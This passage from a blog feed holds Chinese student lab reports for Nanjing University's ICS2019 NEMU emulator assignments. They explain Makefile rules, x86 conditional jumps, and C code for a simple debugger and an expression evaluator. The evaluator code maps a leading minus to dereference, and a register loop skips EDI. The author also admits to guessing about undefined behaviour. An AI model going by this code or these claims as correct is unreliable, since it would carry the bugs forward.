class="hljs-variable">$@</span>)</span>@<span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> <span class="hljs-variable">$(SO_CFLAGS)</span> -c -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$&lt;</span></code></pre></div></div><p>各.c 文件依赖于其中定义的.h 文件（隐含规则）</p><p>依赖关系终于分析完了。下面看到底执行了哪些操作。</p><p><code>$(BINARY)</code>生成第一步，通知tracer去gitcommit一下，commit信息是“compile”。这个函数是在Makefile.git里的，前面通过include引入。</p><p>第二步只是打印一下我现在要链接生成目标了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211050452384_863_20230523230824465256_348_image-20230418221720529.png" alt="image-20230418221720529"><figcaption aria-hidden="true">image-20230418221720529</figcaption></figure><p>最后一行便是生成NEMU的临门一脚。</p><p>顺便说一下执行make run 的过程。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-994i99lmrh9u68"></i><span>makefile</span><div class="collapse show" id="collapse-994i99lmrh9u68"><pre><code class="hljs makefile">NEMU_EXEC := <span class="hljs-variable">$(BINARY)</span> <span class="hljs-variable">$(ARGS)</span> <span class="hljs-variable">$(IMG)</span></code></pre></div></div><p>定义参数:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6z1lknlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-6z1lknlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">override</span> ARGS ?= -l $(BUILD_DIR)/nemu-log.txt<span class="hljs-keyword">override</span> ARGS += -d $(QEMU_SO)</code></pre></div></div><p>override的意思是不允许通过命令行指定的方式替代在Makefile中的变量定义。</p><p>执行出来就是这一句。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211052523101_993_20230523230831361885_388_image-20230418221942591.png" alt="image-20230418221942591"><figcaption aria-hidden="true">image-20230418221942591</figcaption></figure><h3 id="课后题">课后题</h3><p>1.指令使用条件问题</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211053630092_596_20230523230835450240_415_image-20230418163951487.png" alt="image-20230418163951487"><figcaption aria-hidden="true">image-20230418163951487</figcaption></figure><p>为什么用jbe而不是jle？</p><p>jbe用于比较无符号数，jle用于比较有符号数。在 x86中，内存地址被视为无符号整数，所以要用jbe。</p><p>至于为什么源代码里是大于，却用了小于等于，从各种角度看好像两种用法是等价的，不是很清楚CPU为什么要做这种转换。</p><p>下面是用jbe</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mqnnf1lmrh9u68"></i><span>c++</span><div class="collapse show" id="collapse-mqnnf1lmrh9u68"><pre><code class="hljs c++">get_cont:  movl <span class="hljs-number">8</span>(%ebp), %eax   movl <span class="hljs-number">12</span>(%ebp), %edx   cmpl %eax, %edx  ja .<span class="hljs-function">L1</span><span class="hljs-function">  <span class="hljs-title">movl</span> <span class="hljs-params">(%eax)</span>, %eax</span><span class="hljs-function">  jmp .L2</span><span class="hljs-function">.L1:</span><span class="hljs-function">  movl (%edx), %eax</span><span class="hljs-function">.L2:</span></code></pre></div></div><p>2.nemu输出的helloworld和程序中输出的helloworld有什么区别</p><p>指导书在输入输出部分给出了这个问题的答案:</p><p>nemu的helloworld程序是可以说是直接运行在裸机上，可以在AM的抽象下直接输出到设备(串口)；而我们在程序设计课上写的helloworld程序位于操作系统之上，不能直接操作设备，只能通过操作系统提供的服务进行输出，输出的数据要经过很多层抽象才能到达设备层。这个问题问的和<code>为什么要有AM？</code>这个问题很类似。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA1</title>
    <link href="/posts/4251/"/>
    <url>/posts/4251/</url>
    
    <content type="html"><![CDATA[<h1 id="pa1实验报告">PA1实验报告</h1><p>田佳业 2013599</p><p>为了方便VSCode远程连接，采用64位Ubuntu系统完成ics2019对应的PA。因此报告中一部分代码可能会与2018版本不一致。</p><h2 id="pa1.1">PA1.1</h2><p>任务：实现单步执行, 打印寄存器状态, 扫描内存</p><h3 id="开天辟地的篇章">开天辟地的篇章</h3><h4 id="任务">任务</h4><p>这一部分介绍了“最简单的计算机”应当具有哪些特征和功能。</p><h4 id="思考题">思考题</h4><h6 id="计算机可以没有寄存器吗">计算机可以没有寄存器吗？</h6><blockquote><p>存储层次的产生是顺应规律的，我们会自然的把经常访问的数据放在更快的，离CPU更近(更容易获取)的存储介质上。假设计算机“不得不”没有寄存器,我们也会让内存充当”寄存器“的作用(相比磁盘等更慢的介质)，只不过这样会使得性能变差,因为一些需要经常使用的数据也不得不放在内存当中.</p></blockquote><h6 id="计算机的状态模型与图灵机的关系">计算机的状态模型与图灵机的关系？</h6><p>对于TRM来说, 是不是也有这样状态的概念呢? 具体地,什么东西表征了TRM的状态? 在状态模型中, 执行指令和执行程序,其本质分别是什么?</p><blockquote><p>图灵机中“状态”的概念在PA中体现在<code>NEMUState</code>这个结构中。包括<code>{ NEMU_STOP, NEMU_RUNNING, NEMU_END, NEMU_ABORT }</code>，图灵机中”格局“的概念(包括带描述，当前状态和读写头)对应到计算机就像”快照“，分别对应存储器中内容，计算机运行状态和程序计数器。图灵机中输入和转移函数都从”纸带“中获取，就像冯诺依曼体系结构，执行指令和执行程序本质上没有什么区别。</p></blockquote><h3 id="rtfsc">RTFSC</h3><h4 id="任务-1">任务</h4><h5 id="实现x86的寄存器结构体">实现x86的寄存器结构体</h5><p>这一部分讲义中有答案，在此不再列出代码。匿名union可以在共享内存的同时，还能以union内的名称在外部访问。这也适应了PA中”寄存器别名“的需求。</p><h6 id="reg_test0是如何测试你的实现的">reg_test0是如何测试你的实现的？</h6><blockquote><p>代码中的<code>assert()</code>条件是根据什么写出来的:产生随机值到<code>sample</code>数组，让<code>cpu</code>获取，检查是否cpu能够正确获取这些值。ps:通过与1与可以取低位。</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-96pg6xlmrh9u65"></i><span>c</span><div class="collapse show" id="collapse-96pg6xlmrh9u65"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">reg_test</span><span class="hljs-params">()</span> {  <span class="hljs-comment">//init random seed</span>  srand(time(<span class="hljs-number">0</span>));  <span class="hljs-type">uint32_t</span> sample[<span class="hljs-number">8</span>];  <span class="hljs-comment">//generate random values for eip</span>  <span class="hljs-type">uint32_t</span> eip_sample = rand();  cpu.eip = eip_sample;  <span class="hljs-type">int</span> i;  <span class="hljs-comment">//generate random values for general registers</span>  <span class="hljs-keyword">for</span> (i = R_EAX; i &lt;= R_EDI; i ++) {    sample[i] = rand();    reg_l(i) = sample[i];    <span class="hljs-comment">// test whether reg_w() can normally return the low 16 bits of the general register</span>    assert(reg_w(i) == (sample[i] &amp; <span class="hljs-number">0xffff</span>));  }    <span class="hljs-comment">// test whether reg_w() can normally return the low 8 bits of the general register</span>  assert(reg_b(R_AL) == (sample[R_EAX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_AH) == ((sample[R_EAX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_BL) == (sample[R_EBX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_BH) == ((sample[R_EBX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_CL) == (sample[R_ECX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_CH) == ((sample[R_ECX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_DL) == (sample[R_EDX] &amp; <span class="hljs-number">0xff</span>));  assert(reg_b(R_DH) == ((sample[R_EDX] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>));  <span class="hljs-comment">// test the alias of general registers</span>  assert(sample[R_EAX] == cpu.eax);  assert(sample[R_ECX] == cpu.ecx);  assert(sample[R_EDX] == cpu.edx);  assert(sample[R_EBX] == cpu.ebx);  assert(sample[R_ESP] == cpu.esp);  assert(sample[R_EBP] == cpu.ebp);  assert(sample[R_ESI] == cpu.esi);  assert(sample[R_EDI] == cpu.edi);  assert(eip_sample == cpu.eip);}</code></pre></div></div><h6 id="究竟要执行多久">究竟要执行多久？</h6><p>在<code>cmd_c()</code>函数中,调用<code>cpu_exec()</code>的时候传入了参数<code>-1</code>的含义？</p><blockquote><p><code>-1</code>的十六进制表示就是<code>0xffffffff</code>,然后这是一个无符号的类型, 所以是最大的无符号数,所以在正常情况下(<code>nemu_state.state == NEMU_RUNNING</code>)会一直执行下去。在for循环内，2018版的PA为<code>exec_wrapper</code>，2019PA为<code>exec_once</code>就做了图灵机章节中所述三件基本事情：取指，执行，更新PC。</p></blockquote><h6 id="潜在的威胁">潜在的威胁</h6><p>"调用<code>cpu_exec()</code>的时候传入了参数<code>-1</code>",这一做法属于未定义行为吗? 请查阅C99手册确认你的想法.</p><blockquote><p>C99的文档并不太好找，但猜测既然这么问，很可能是属于未定义行为。</p></blockquote><h6 id="温故而知新">温故而知新</h6><p><code>opcode_table</code>到底是个什么类型的数组?</p><blockquote><p><code>OpcodeEntry</code>类型。定义如下：</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-28p6k3lmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-28p6k3lmrh9u65"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> {  DHelper decode;  EHelper execute;  <span class="hljs-type">int</span> width;} OpcodeEntry;</code></pre></div></div><h6 id="有始有终">有始有终</h6><p>对于GNU/Linux上的一个程序, 怎么样才算开始? 怎么样才算是结束?对于在NEMU中运行的程序, 问题的答案又是什么呢?</p><blockquote><p>NEMU中为什么要有<code>nemu_trap</code>? 为什么要有monitor?</p><p>在GNU/Linux上的一个C程序，main函数只是充当一个”入口“的作用，在main函数调用之前，为了保证程序可以顺利进行，要先初始化进程执行环境，如堆分配初始化、线程子系统等，如果是C++，C++的全局对象构造函数也是这一时期被执行的，全局析构函数是main之后执行的。</p><p>Linux一般程序的入口是__start函数，有两个段：</p><ul><li>.init段：进程的初始化代码，一个程序开始运行时，在main函数调用之前，会先运行.init段中的代码。</li><li>.fini段：进程终止代码，当main函数正常退出后，glibc会安排执行该段代码。</li></ul><p>在NEMU中<code>nemu_trap</code>指令,就是让程序来结束运行的。定义一个结束程序的API,比如<code>void halt()</code>,它对不同架构上程序的不同结束方式进行了抽象:程序只要调用<code>halt()</code>就可以结束运行。</p></blockquote><h3 id="基础设施">基础设施</h3><h4 id="任务-2">任务</h4><p>这一部分主要是需要实现一个简易调试器，在<code>nemu/src/monitor/debug/ui.c</code>中仿照给出的命令可以比较容易的完成，并没有遇到比较大的困难。</p><h5 id="单步执行">单步执行</h5><p>如果给出参数，执行指定步数，没有，执行一步。读取<code>si</code>后面的数字可以用<code>*args</code>参数，当然根据文档提示也可以用<code>strtok</code>。下面两种实现方式都是可以的。注意用<code>strtok</code>时由于在<code>ui_mainloop</code>中已经传入的<code>str</code>，根据<code>strtok</code>是使用方式后续第一和参数应当使用<code>NULL</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-349c5tlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-349c5tlmrh9u65"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">cmd_si</span><span class="hljs-params">(<span class="hljs-type">char</span> *args)</span> </span>{  <span class="hljs-type">int</span> step = <span class="hljs-number">1</span>;  <span class="hljs-keyword">if</span> (args != <span class="hljs-literal">NULL</span>) {    <span class="hljs-built_in">sscanf</span>(args, <span class="hljs-string">"%d"</span>, &amp;step);  }  <span class="hljs-built_in">cpu_exec</span>(step);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xw5qbmlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-xw5qbmlmrh9u65"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">cmd_si</span><span class="hljs-params">(<span class="hljs-type">char</span> *args)</span></span>{  <span class="hljs-type">char</span> * step_c= <span class="hljs-built_in">strtok</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">" "</span>);  <span class="hljs-keyword">if</span>(step_c == <span class="hljs-literal">NULL</span>){    <span class="hljs-built_in">cpu_exec</span>(<span class="hljs-number">1</span>);  }  <span class="hljs-keyword">else</span>{    <span class="hljs-type">int</span> step = <span class="hljs-built_in">atoi</span>(step_c);    <span class="hljs-built_in">cpu_exec</span>(step);  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205843099038_654_20230322090859031854_838_image-20230321183104988.png" alt="image-20230321183104988"><figcaption aria-hidden="true">image-20230321183104988</figcaption></figure><h5 id="打印寄存器">打印寄存器</h5><p>201版本的PA针对不同体系结构的寄存器读取做了抽象，因此在<code>cmd_info</code>中调用<code>isa_reg_display</code>，具体工作在这个函数中进行。</p><p>对于x86实现如下，仿照了gdb的格式，输出寄存器，二进制和十进制值。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e6umttlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-e6umttlmrh9u65"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">isa_reg_display</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// it works like the gdb command "info reg"</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = R_EAX; i &lt;= R_EDI; i++)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"$%s\t0x%08x\t%d\n"</span>, regsl[i], <span class="hljs-built_in">reg_l</span>(i), <span class="hljs-built_in">reg_l</span>(i));  }  <span class="hljs-comment">//print pc</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"$eip\t0x%08x\n"</span>, cpu.pc);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205844107732_739_20230322090859916082_681_image-20230321183847648.png" alt="image-20230321183847648"><figcaption aria-hidden="true">image-20230321183847648</figcaption></figure><h4 id="实现扫描内存">实现扫描内存</h4><p>这一部分也比较容易，使用用<code>sscanf</code>读取参数，并调用<code>isa_vaddr_read</code>进行读取即可。代码不再赘述。</p><h4 id="问题">问题</h4><h6 id="基础设施-提高项目开发的效率">基础设施-提高项目开发的效率</h6><p>现在我们来假设我们没有提供一键编译的功能,你需要通过手动键入 gcc命令的方式来编译源文件:假 设你手动输入一条 gcc 命令需要 10秒的时间(你还需要输入很多编译选项,能用 10 秒输入完已经是非常快的了), 而NEMU 工程下有 30 个源文件,为了编译出 NEMU的可执行文件,你需要花费多少时间?然而你还需要在开发 NEMU的过程中不断进行编译,假设你需要编译 500 次 NEMU 才能完成PA,一学期下来,你仅仅花在键入编译命令上的时间有多少?</p><p>需要15000s的时间。因此虽然make的语法显得非常晦涩，但和其他GNU工具链一样，当充分熟悉之后可以极大提高开发效率。</p><h6 id="如何测试字符串处理函数">如何测试字符串处理函数？</h6><p>你可以考虑一下, 你会如何测试自己编写的字符串处理函数?</p><blockquote><p>可以像表达式求值一样的思路。如果有已知的库函数能够解决问题，可以通过编写测试用例对照测试。如果没有，可以尝试使用不同的方式实现，进行对照。但这会受到已有思路的限制。当然，最基础的断言，打断点等调试手段也会有帮助，</p></blockquote><h6 id="好像有点不对劲">好像有点不对劲</h6><p>和默认镜像进行对比的时候, 扫描内存的结果貌似有点不太一样.你知道这是为什么吗?</p><blockquote><p>2019版的这个问题，现在还不是很明白，不过猜测与内存地址转换有关系。</p></blockquote><h2 id="pa1.2">PA1.2</h2><h3 id="表达式求值">表达式求值</h3><h4 id="任务-3">任务</h4><p>完成表达式求值的功能。在编译原理的词法分析部分已经有所基础，但在实际编码的过程中尽管也查阅的网上很多资料，写起来也并不太顺手，也是整个实验中耗时最长的一部分。不过有前人的铺垫结合自己的的理解，测试的过程总体还算顺利，所幸没有遇到太奇怪的bug。</p><h5 id="测试程序">测试程序</h5><p>在写这一周目部分代码之前先做的是测试部分(==后面发现2018的PA并没有要求实现这一部分(捂脸))。测试部分如文档所述非常巧妙，生成随机的数字和操作符，然后写了一个模版c程序把表达式通过<code>sprintf</code>”嵌入“到代码中最后使用系统命令编译运行这个C程序。这一部分可以详见<code>nemu/tools/gen-expr/gen-expr.c</code>部分。不过递归的实现还有些小问题，比如连续生成数字或运算结果过大导致结果溢出int范围等。最后还是从里面找了一些正常的表达式手动输入进行测试的。</p><h5 id="添加正则">添加正则</h5><p>编译原理课这一块已经很熟悉了。其中寄存器可以采用宽松验证和准确验证。对于debugger来说准确验证更好，还是尽量避免未知行为的发生。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wf9mbflmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-wf9mbflmrh9u65"><pre><code class="hljs c++"><span class="hljs-comment">// {"\\$[a-zA-Z]+",TK_REG}, //register</span><span class="hljs-comment">// more specific</span>{<span class="hljs-string">"\\$(e[abcd]x|e[sbi]p|e[ds]i|[abcd]x|[sb]p|[ds]i)"</span>, TK_REG}};</code></pre></div></div><h5 id="make_token">make_token</h5><p>添加完规则后，框架中已经给出了<code>match</code>的过程，我们只需要把匹配到的<code>token</code>信息保存下来即可。</p><h5 id="预处理">预处理</h5><p>在进入求值部分之前，为了区分负数和减号以及解引用和乘号，按照讲义的思路先过一遍预处理。一个坑是判断是数字的时候不要忘了有十六进制数的存在。这个小问题是写<code>eval</code>函数处理十六进制数的时候想起来的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s0kkpmlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-s0kkpmlmrh9u65"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">expr</span><span class="hljs-params">(<span class="hljs-type">char</span> *e, <span class="hljs-type">bool</span> *success)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">make_token</span>(e))  {    *success = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Insert codes to evaluate the expression. */</span>  <span class="hljs-comment">// handle the deref and neg at the first</span>  <span class="hljs-comment">// because if the * or - is at the first, it must be unary operator</span>  <span class="hljs-comment">// pre-processing</span>  <span class="hljs-keyword">if</span> (tokens[<span class="hljs-number">0</span>].type == <span class="hljs-string">'-'</span>)  {    tokens[<span class="hljs-number">0</span>].type = TK_DEREF;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tokens[<span class="hljs-number">0</span>].type == <span class="hljs-string">'*'</span>)  {    tokens[<span class="hljs-number">0</span>].type = TK_DEREF;  }  <span class="hljs-comment">// parse the rest tokens</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; nr_token; i++)  {    <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">'-'</span>)    {      <span class="hljs-keyword">if</span> (tokens[i - <span class="hljs-number">1</span>].type != TK_NUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_HEXNUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_REG &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != <span class="hljs-string">')'</span>)      {        tokens[i].type = TK_NEG;      }    }    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">'*'</span>)    {      <span class="hljs-keyword">if</span> (tokens[i - <span class="hljs-number">1</span>].type != TK_NUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_HEXNUM &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != TK_REG &amp;&amp; tokens[i - <span class="hljs-number">1</span>].type != <span class="hljs-string">')'</span>)      {        tokens[i].type = TK_DEREF;      }    }  }  *success = <span class="hljs-literal">true</span>;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-number">0</span>, nr_token - <span class="hljs-number">1</span>);  <span class="hljs-comment">// return 0;</span>}</code></pre></div></div><h5 id="eval递归求值">eval递归求值</h5><p>这一部分是这个任务的核心，讲义中也给出了实现的思路。我的实现代码如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p7omwhlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-p7omwhlmrh9u65"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> (p &gt; q)  {    <span class="hljs-comment">/* Bad expression */</span>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Bad expression"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p == q)  {    <span class="hljs-keyword">switch</span> (tokens[p].type)    {    <span class="hljs-keyword">case</span> TK_NUM:      <span class="hljs-keyword">return</span> <span class="hljs-built_in">atoi</span>(tokens[p].str);    <span class="hljs-keyword">case</span> TK_HEXNUM:      <span class="hljs-keyword">return</span> <span class="hljs-built_in">strtol</span>(tokens[p].str, <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);    <span class="hljs-keyword">case</span> TK_REG:;      <span class="hljs-comment">// remove the $ in the string</span>      <span class="hljs-type">char</span> *reg_name = tokens[p].str + <span class="hljs-number">1</span>;      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = R_EAX; i &lt; R_EDI; i++)      {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(reg_name, m_regsl[i]) == <span class="hljs-number">0</span>)        {          <span class="hljs-keyword">return</span> <span class="hljs-built_in">reg_l</span>(i);        }        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(reg_name, m_regsw[i]) == <span class="hljs-number">0</span>)        {          <span class="hljs-keyword">return</span> <span class="hljs-built_in">reg_w</span>(i);        }        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(reg_name, m_regsb[i]) == <span class="hljs-number">0</span>)        {          <span class="hljs-keyword">return</span> <span class="hljs-built_in">reg_b</span>(i);        }      }      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(tokens[p].str, <span class="hljs-string">"$eip"</span>) == <span class="hljs-number">0</span>)      {        <span class="hljs-keyword">return</span> cpu.pc;      }      <span class="hljs-keyword">else</span>      {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error in TK_REG in eval()\n"</span>);        <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);      }    }  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check_parentheses</span>(p, q) == <span class="hljs-literal">true</span>)  {    <span class="hljs-comment">/* The expression is surrounded by a matched pair of parentheses.</span><span class="hljs-comment">     * If that is the case, just throw away the parentheses.</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(p + <span class="hljs-number">1</span>, q - <span class="hljs-number">1</span>);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-type">int</span> op_pos = <span class="hljs-built_in">get_domin_op_pos</span>(p, q);    <span class="hljs-comment">// printf("op_pos=%d\n", op_pos);</span>    <span class="hljs-type">uint32_t</span> val2 = <span class="hljs-built_in">eval</span>(op_pos + <span class="hljs-number">1</span>, q);    <span class="hljs-comment">// printf("p=%d\n", p);</span>    <span class="hljs-keyword">if</span> (op_pos == p)    {      <span class="hljs-keyword">switch</span> (tokens[op_pos].type)      {      <span class="hljs-keyword">case</span> TK_DEREF:        <span class="hljs-keyword">return</span> <span class="hljs-built_in">vaddr_read</span>(val2, <span class="hljs-number">4</span>);      <span class="hljs-keyword">case</span> TK_NEG:        <span class="hljs-keyword">return</span> -val2;      <span class="hljs-keyword">case</span> TK_NOT:        <span class="hljs-keyword">return</span> !val2;      <span class="hljs-keyword">default</span>:        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"unrecognized single operator in eval()"</span>);      }    }    <span class="hljs-type">uint32_t</span> val1 = <span class="hljs-built_in">eval</span>(p, op_pos - <span class="hljs-number">1</span>);    <span class="hljs-keyword">switch</span> (tokens[op_pos].type)    {    <span class="hljs-keyword">case</span> <span class="hljs-string">'+'</span>:      <span class="hljs-keyword">return</span> val1 + val2;    <span class="hljs-keyword">case</span> <span class="hljs-string">'-'</span>:      <span class="hljs-keyword">return</span> val1 - val2;    <span class="hljs-keyword">case</span> <span class="hljs-string">'*'</span>:      <span class="hljs-keyword">return</span> val1 * val2;    <span class="hljs-keyword">case</span> <span class="hljs-string">'/'</span>:      <span class="hljs-keyword">return</span> val1 / val2;    <span class="hljs-keyword">case</span> TK_AND:      <span class="hljs-keyword">return</span> val1 &amp;&amp; val2;    <span class="hljs-keyword">case</span> TK_OR:      <span class="hljs-keyword">return</span> val1 || val2;    <span class="hljs-keyword">case</span> TK_EQ:      <span class="hljs-keyword">return</span> val1 == val2;    <span class="hljs-keyword">case</span> TK_NEQ:      <span class="hljs-keyword">return</span> val1 != val2;    <span class="hljs-keyword">default</span>:      <span class="hljs-built_in">panic</span>(<span class="hljs-string">"unrecognized operator in eval()"</span>);    }  }  <span class="hljs-comment">// should not reach here, but if not return, gcc will complain</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}</code></pre></div></div><p>最后求值的时候，<code>if (op_pos == p)</code>条件可以使单目运算优先被处理，这一点也是参照了网上的代码才想到。</p><p>其中<code>check_parentheses(p, q)</code>部分的实现不复杂，扫一遍就可以了。先判断左右两端是否被括号包围，再判断里面的括号是否匹配。这一部分代码较简单，不再赘述。</p><p>获取优先级部分比较复杂，又回到了被编译原理支配的痛苦。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0sc6iflmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-0sc6iflmrh9u65"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_domin_op_pos</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span></span><span class="hljs-function"></span>{  <span class="hljs-type">int</span> bracket_cnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">// level 0: * - !</span>  <span class="hljs-comment">// level 1: * /</span>  <span class="hljs-comment">// level 2: + -</span>  <span class="hljs-comment">// level 3: &amp;&amp;</span>  <span class="hljs-comment">// level 4: ||</span>  <span class="hljs-comment">// level 5: == !=</span>  <span class="hljs-type">int</span> levels[<span class="hljs-number">6</span>] = {<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>};  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = p; i &lt; q; i++)  {    <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">'('</span>)    {      bracket_cnt++;    }    <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">')'</span>)    {      bracket_cnt--;    }    <span class="hljs-keyword">if</span> (bracket_cnt == <span class="hljs-number">0</span>)    {      <span class="hljs-keyword">switch</span> (tokens[i].type)      {      <span class="hljs-keyword">case</span> TK_DEREF:      <span class="hljs-keyword">case</span> TK_NEG:      <span class="hljs-keyword">case</span> TK_NOT:        <span class="hljs-keyword">if</span> (levels[<span class="hljs-number">0</span>] == <span class="hljs-number">-1</span>)        {          levels[<span class="hljs-number">0</span>] = i;        }        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> <span class="hljs-string">'*'</span>:      <span class="hljs-keyword">case</span> <span class="hljs-string">'/'</span>:        levels[<span class="hljs-number">1</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> <span class="hljs-string">'+'</span>:      <span class="hljs-keyword">case</span> <span class="hljs-string">'-'</span>:        levels[<span class="hljs-number">2</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> TK_AND:        levels[<span class="hljs-number">3</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> TK_OR:        levels[<span class="hljs-number">4</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> TK_EQ:      